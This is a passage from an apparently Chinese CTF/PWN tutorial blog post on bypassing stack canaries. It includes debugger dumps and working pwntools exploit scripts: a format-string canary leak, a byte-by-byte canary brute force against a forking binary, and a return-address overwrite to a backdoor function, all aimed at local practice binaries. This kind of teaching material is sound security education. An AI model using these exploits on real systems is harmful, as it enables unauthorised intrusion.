<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">eax</span>            <span class="hljs-number">0</span>x0                 <span class="hljs-number">0</span><br><span class="hljs-attribute">ecx</span>            <span class="hljs-number">0</span>xf7fa29c0          -<span class="hljs-number">134600256</span><br><span class="hljs-attribute">edx</span>            <span class="hljs-number">0</span>x2b539700          <span class="hljs-number">726898432</span><br><span class="hljs-attribute">ebx</span>            <span class="hljs-number">0</span>xf7fa1000          -<span class="hljs-number">134606848</span><br><span class="hljs-attribute">esp</span>            <span class="hljs-number">0</span>xffffd120          <span class="hljs-number">0</span>xffffd120<br><span class="hljs-attribute">ebp</span>            <span class="hljs-number">0</span>xffffd168          <span class="hljs-number">0</span>xffffd168<br><span class="hljs-attribute">esi</span>            <span class="hljs-number">0</span>xffffd224          -<span class="hljs-number">11740</span><br><span class="hljs-attribute">edi</span>            <span class="hljs-number">0</span>xf7ffcb80          -<span class="hljs-number">134231168</span><br><span class="hljs-attribute">eip</span>            <span class="hljs-number">0</span>x80485ed           <span class="hljs-number">0</span>x80485ed &lt;main+<span class="hljs-number">140</span>&gt;<br><span class="hljs-attribute">eflags</span>         <span class="hljs-number">0</span>x246              <span class="hljs-meta"> [ PF ZF IF ]</span><br><span class="hljs-attribute">cs</span>             <span class="hljs-number">0</span>x23                <span class="hljs-number">35</span><br><span class="hljs-attribute">ss</span>             <span class="hljs-number">0</span>x2b                <span class="hljs-number">43</span><br><span class="hljs-attribute">ds</span>             <span class="hljs-number">0</span>x2b                <span class="hljs-number">43</span><br><span class="hljs-attribute">es</span>             <span class="hljs-number">0</span>x2b                <span class="hljs-number">43</span><br><span class="hljs-attribute">fs</span>             <span class="hljs-number">0</span>x0                 <span class="hljs-number">0</span><br><span class="hljs-attribute">gs</span>             <span class="hljs-number">0</span>x63                <span class="hljs-number">99</span><br></code></pre></td></tr></table></figure>

<p>然后再结合上面打印出来的内存</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">20</span>wx <span class="hljs-number">0</span>xffffd120<br><span class="hljs-attribute">0xffffd120</span>:	<span class="hljs-number">0</span>xffffd134	<span class="hljs-number">0</span>x00000000	<span class="hljs-number">0</span>x00000001	<span class="hljs-number">0</span>x00000000<br><span class="hljs-attribute">0xffffd130</span>:	<span class="hljs-number">0</span>xf7fbe4a0	<span class="hljs-number">0</span>x61616161	<span class="hljs-number">0</span>xf7d8f400	<span class="hljs-number">0</span>xf7fbe4a0<br><span class="hljs-attribute">0xffffd140</span>:	<span class="hljs-number">0</span>xffffd180	<span class="hljs-number">0</span>xf7fbe66c	<span class="hljs-number">0</span>xf7fbeb10	<span class="hljs-number">0</span>x00000001<br><span class="hljs-attribute">0xffffd150</span>:	<span class="hljs-number">0</span>x00000001	<span class="hljs-number">0</span>x00000000	<span class="hljs-number">0</span>xf7fa1000	<span class="hljs-number">0</span>x2b539700 &lt;--<br><span class="hljs-attribute">0xffffd160</span>:	<span class="hljs-number">0</span>xffffd3eb	<span class="hljs-number">0</span>x00000070	<span class="hljs-number">0</span>xf7ffd020	<span class="hljs-number">0</span>xf7d98519<br></code></pre></td></tr></table></figure>

<p>我们可以得知，Canary的偏移为15，所以我们只需要再第一次<code>get</code>时发送<code>%15$x</code>就会泄露出Canary的值</p>
<p>然后我们开始确定第一次的<code>gets</code>到Canary的偏移，同时，我们知道<code>v5</code>是用来储存Canary值的（为什么，看伪代码注释），打开IDA，查看栈</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-0000000000000040 // Use data definition commands to manipulate stack variables and arguments.</span><br><span class="hljs-deletion">-0000000000000040 // Frame size: 40; Saved regs: 4; Purge: 0</span><br><span class="hljs-deletion">-0000000000000040</span><br>……<br><span class="hljs-deletion">-000000000000002C     char s;					&lt;--</span><br>……<br><span class="hljs-deletion">-0000000000000004     _DWORD var_4;				&lt;--</span><br><span class="hljs-addition">+0000000000000000     _DWORD __saved_registers;</span><br><span class="hljs-addition">+0000000000000004     _UNKNOWN *__return_address;</span><br><span class="hljs-addition">+0000000000000008     int argc;</span><br><span class="hljs-addition">+000000000000000C     const char **argv;</span><br><span class="hljs-addition">+0000000000000010     const char **envp;</span><br><span class="hljs-addition">+0000000000000014</span><br></code></pre></td></tr></table></figure>

<p>二者距离EBP的距离相减即为数组s到Canary的距离，为40字节</p>
<p>然后确定Canary到EBP的偏移，用上面在<code>xor</code>下断点后的gdb调试页面</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">*<span class="hljs-built_in">EAX</span>  <span class="hljs-number">0</span><br> <span class="hljs-built_in">EBX</span>  <span class="hljs-number">0xf7fa1000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="hljs-number">0x229dac</span><br>*<span class="hljs-built_in">ECX</span>  <span class="hljs-number">0xf7fa29c0</span> (_IO_stdfile_0_lock) ◂— <span class="hljs-number">0</span><br>*<span class="hljs-built_in">EDX</span>  <span class="hljs-number">0x2b539700</span><br> <span class="hljs-built_in">EDI</span>  <span class="hljs-number">0xf7ffcb80</span> (_rtld_global_ro) ◂— <span class="hljs-number">0</span><br> <span class="hljs-built_in">ESI</span>  <span class="hljs-number">0xffffd224</span> —▸ <span class="hljs-number">0xffffd3eb</span> ◂— <span class="hljs-string">&#x27;/home/xyq/test/binary_200&#x27;</span><br> <span class="hljs-built_in">EBP</span>  <span class="hljs-number">0xffffd168</span> —▸ <span class="hljs-number">0xf7ffd020</span> (_rtld_global) —▸ <span class="hljs-number">0xf7ffda40</span> ◂— <span class="hljs-number">0</span><br> <span class="hljs-built_in">ESP</span>  <span class="hljs-number">0xffffd120</span> —▸ <span class="hljs-number">0xffffd134</span> ◂— <span class="hljs-number">0x61616100</span><br>*<span class="hljs-built_in">EIP</span>  <span class="hljs-number">0x80485ed</span> (main+<span class="hljs-number">140</span>) ◂— <span class="hljs-keyword">xor</span> <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">gs</span>:[<span class="hljs-number">0x14</span>]<br></code></pre></td></tr></table></figure>

<p>这里已经有了ESP，EBP的地址，我们就可以算出v5 &#x3D; ESP + 0x3C &#x3D; 0xffffD15C，v5距离EBP的偏移量为EBP-v5为12字节</p>
<p>接下来，我们就可以构建EXP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 启动要调试的二进制文件对应的进程</span><br>p = process(<span class="hljs-string">&#x27;./binary_200&#x27;</span>)<br><br><span class="hljs-comment"># 定义system函数的地址，这里需根据实际情况调整地址是否正确</span><br>system_addr = <span class="hljs-number">0x0804854d</span><br><br><span class="hljs-comment"># 发送格式化字符串，尝试获取信息（比如可能是获取canary值相关的操作）</span><br>p.sendline(<span class="hljs-string">&#x27;%15$x&#x27;</span>)<br><br><span class="hljs-comment"># 接收数据并转换为十六进制整数，注意要先将字节数据解码为字符串再转换</span><br>Canary = <span class="hljs-built_in">int</span>(p.recv().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(Canary))<br><br><span class="hljs-comment"># 构造payload，这里先构造填充的 &#x27;A&#x27; 字符串以及按格式拼接其他部分</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">40</span> + p32(Canary) + <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">12</span> + p32(system_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br><span class="hljs-built_in">print</span>(payload)<br><br><span class="hljs-comment"># 发送构造好的payload</span><br>p.sendline(payload)<br><br><span class="hljs-comment"># 进入交互模式</span><br>p.interactive()<br></code></pre></td></tr></table></figure>

<hr>
<p>以下方法为进阶方法，学习参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43713800/article/details/105273284">https://blog.csdn.net/weixin_43713800/article/details/105273284</a></p>
<h3 id="one-by-one爆破Canary"><a href="#one-by-one爆破Canary" class="headerlink" title="one-by-one爆破Canary"></a>one-by-one爆破Canary</h3><p>学习参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/cx5zci#">https://www.yuque.com/cyberangel/rg9gdm/cx5zci#</a></p>
<p>32位的Canary值一般放在<code>edp - 0xc</code>，这个不紧邻栈底，64位一般在<code>rbp-0x8</code>，与栈底相邻。不同编译器情况可能不同</p>
<p>对于 Canary，虽然每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary  是相同的， 并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork  函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 在著名的 offset2libc 绕过  linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary: 这是爆破的 Python 代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Brute forcing stack canary &quot;</span><br><br>start = <span class="hljs-built_in">len</span>(p)<br>stop = <span class="hljs-built_in">len</span>(p)+<span class="hljs-number">8</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(p) &lt; stop:<br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>      res = send2server(p + <span class="hljs-built_in">chr</span>(i))<br><br>      <span class="hljs-keyword">if</span> res != <span class="hljs-string">&quot;&quot;</span>:<br>         p = p + <span class="hljs-built_in">chr</span>(i)<br>         <span class="hljs-comment">#print &quot;\t[+] Byte found 0x%02x&quot; % i</span><br>         <span class="hljs-keyword">break</span><br><br>      <span class="hljs-keyword">if</span> i == <span class="hljs-number">255</span>:<br>         <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] Exploit failed&quot;</span><br>         sys.exit(-<span class="hljs-number">1</span>)<br><br><br>canary = p[stop:start-<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>].encode(<span class="hljs-string">&quot;hex&quot;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;   [+] SSP value is 0x%s&quot;</span> % canary<br></code></pre></td></tr></table></figure>

<p>关于为什么可以一字节一字节地爆破，网上地说法是，除最低字节外，从次低字节开始，往上爆破，只要正确，就不会报错。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>查一下保护，32位程序，开启了NX保护，Canary保护</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>       <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br><span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br></code></pre></td></tr></table></figure>

<p>看一下源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">__pid_t</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  init();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v3 = fork();<br>    <span class="hljs-keyword">if</span> ( v3 &lt; <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( v3 )<br>    &#123;<br>      wait(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;welcome&quot;</span>);<br>      fun();<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;recv sucess&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fork error&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>我们解释一下这段代码</p>
<ul>
<li>**<code>v3 = fork();</code>**在每次循环中都会调用 <code>fork</code> 系统调用创建一个新的进程，和前面介绍的一样，<code>fork</code> 会创建出子进程，并且在父进程和子进程中分别返回不同的值（父进程返回子进程 ID，子进程返回 0），然后将返回值赋给 <code>v3</code> 变量。</li>
<li>**<code>if (v3 &lt; 0)</code>**如果 <code>v3</code> 的值小于 0，说明 <code>fork</code> 系统调用失败了（可能由于系统资源不足等原因无法创建新进程），此时执行 <code>break</code> 语句跳出 <code>while</code> 循环。</li>
<li>**<code>if (v3)</code>**如果 <code>v3</code> 的值不为 0（也就是在父进程中，因为父进程中 <code>fork</code> 返回的是子进程的 ID，大于 0），会调用 <code>wait(0)</code> 函数。<code>wait</code> 函数用于让父进程阻塞等待，直到它的某个子进程结束运行，参数 <code>0</code> 表示等待任意子进程结束，并且获取子进程的退出状态等相关信息</li>
<li>当 <code>v3</code> 的值为 0 时，也就是在子进程中，会依次执行以下操作</li>
</ul>
<p>在上面我们可以看到，<code>mian</code>函数中存在<code>fork</code>函数，这是我们爆破Canary的关键</p>
<p>我看来看<code>fun</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span><br>&#123;<br>  _BYTE buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+8h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x78u</span>);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>我们发现read(0, &amp;buf, 0x78u);通过对栈段进行查看，我们可以输入0x78的内容，但是buf的空间为：0x70-0xC&#x3D;0x64，很明显可以发生栈溢出覆盖其他变量。其中v2就是保存Canary的变量。</p>
<p>所以我们的思路是一位一位的来爆破Canary，详细点来说使用栈溢出填充垃圾字符直到Canary，然后再尝试填充我们的Canary。若Canary正确，则进行下一位的爆破；若Canary错误，程序会执行fork重新运行。</p>
<p>下面是爆破Canary的通用模板：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置日志级别为debug，方便查看详细交互信息</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment"># 设置目标二进制架构为i386，操作系统为linux</span><br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># 配置终端相关参数，用于后续可能的调试操作（例如结合gdb等）</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br><br><span class="hljs-comment"># 判断是本地运行还是远程运行，默认为本地运行模式</span><br>local = <span class="hljs-number">1</span><br><br><span class="hljs-comment"># 加载目标二进制文件</span><br>elf = ELF(<span class="hljs-string">&#x27;./bin1&#x27;</span>)<br><br><span class="hljs-keyword">if</span> local:<br>    <span class="hljs-comment"># 本地运行，启动本地的目标二进制程序进程</span><br>    p = process(<span class="hljs-string">&#x27;./bin1&#x27;</span>)<br>    <span class="hljs-comment">#libc = elf.libc</span><br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;&#x27;</span>,)<br>    libc = ELF(<span class="hljs-string">&#x27;./&#x27;</span>)<br><br><span class="hljs-comment"># 接收数据直到出现&#x27;welcome\n&#x27;，确保程序准备好接收后续输入</span><br>p.recvuntil(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>)<br><span class="hljs-comment"># 初始化Canary值为空字节串</span><br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在爆破Canary的第&#123;&#125;位&quot;</span>.<span class="hljs-built_in">format</span>(k + <span class="hljs-number">1</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;当前的字符为&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">chr</span>(i)))<br>        payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">100</span> + canary + <span class="hljs-built_in">bytes</span>([i])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;当前payload为：&quot;</span>, payload)<br>        <span class="hljs-comment"># 发送payload给目标程序（进程或者远程服务器）</span><br>        p.send(payload)<br>        <span class="hljs-comment"># 接收目标程序返回的数据，直到出现&#x27;welcome\n&#x27;</span><br>        data = p.recvuntil(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;sucess&quot;</span> <span class="hljs-keyword">in</span> data:<br>            canary += <span class="hljs-built_in">bytes</span>([i])<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Canary is: &quot;</span>, canary)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<p>其中：</p>
<p><code>context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;bash&#39;, &#39;-c&#39;]</code>：配置在调试等情况下要启动的终端相关参数，这里指定了如果需要启动终端时使用 <code>gnome-terminal</code>，并传递一些参数来执行命令（<code>-x</code> 表示后面跟着要执行的命令，这里是 <code>bash -c</code>，即启动一个 <code>bash</code> 子进程并执行后续的命令），通常是为了方便在利用过程中使用 <code>gdb</code> 等调试工具能在合适的终端环境下启动。</p>
<p>以下是本题的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置日志级别为debug，方便查看详细交互信息</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment"># 设置目标二进制架构为i386，操作系统为linux</span><br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># 配置终端相关参数，用于后续可能的调试操作（例如结合gdb等）</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br><br><span class="hljs-comment"># 判断是本地运行还是远程运行，默认为本地运行模式</span><br>local = <span class="hljs-number">1</span><br><br><span class="hljs-comment"># 加载目标二进制文件</span><br>elf = ELF(<span class="hljs-string">&#x27;./bin1&#x27;</span>)<br><br><span class="hljs-keyword">if</span> local:<br>    <span class="hljs-comment"># 本地运行，启动本地的目标二进制程序进程</span><br>    p = process(<span class="hljs-string">&#x27;./bin1&#x27;</span>)<br>    <span class="hljs-comment">#libc = elf.libc</span><br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;&#x27;</span>,)<br>    libc = ELF(<span class="hljs-string">&#x27;./&#x27;</span>)<br><br><span class="hljs-comment"># 接收数据直到出现&#x27;welcome\n&#x27;，确保程序准备好接收后续输入</span><br>p.recvuntil(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>)<br><span class="hljs-comment"># 初始化Canary值为空字节串</span><br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在爆破Canary的第&#123;&#125;位&quot;</span>.<span class="hljs-built_in">format</span>(k + <span class="hljs-number">1</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;当前的字符为&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">chr</span>(i)))<br>        payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">100</span> + canary + <span class="hljs-built_in">bytes</span>([i])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;当前payload为：&quot;</span>, payload)<br>        <span class="hljs-comment"># 发送payload给目标程序（进程或者远程服务器）</span><br>        p.send(payload)<br>        <span class="hljs-comment"># 接收目标程序返回的数据，直到出现&#x27;welcome\n&#x27;</span><br>        data = p.recvuntil(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;sucess&quot;</span> <span class="hljs-keyword">in</span> data:<br>            canary += <span class="hljs-built_in">bytes</span>([i])<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Canary is: &quot;</span>, canary)<br>            <span class="hljs-keyword">break</span><br>addr = <span class="hljs-number">0x0804863B</span>	<span class="hljs-comment">#后门函数地址</span><br>payload = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">100</span> + canary + <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">12</span> + p32(addr)<br><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="劫持-stack-chk-fail-函数"><a href="#劫持-stack-chk-fail-函数" class="headerlink" title="劫持__stack_chk_fail 函数"></a>劫持__stack_chk_fail 函数</h3><p>已知 Canary 失败的处理逻辑会进入到 __stack_chk_failed 函数，__stack_chk_failed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p>
<p>参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 __stack_chk_fail 的 GOT 表，再进行 ROP 利用</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/PWN/" class="category-chain-item">PWN</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%8E%9F%E5%88%9B/" class="print-no-link">#原创</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>canary保护机制以及解决方法</div>
      <div>http://example.com/2025/02/25/canary保护机制以及解决方法/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Ginat_USB</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年2月25日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
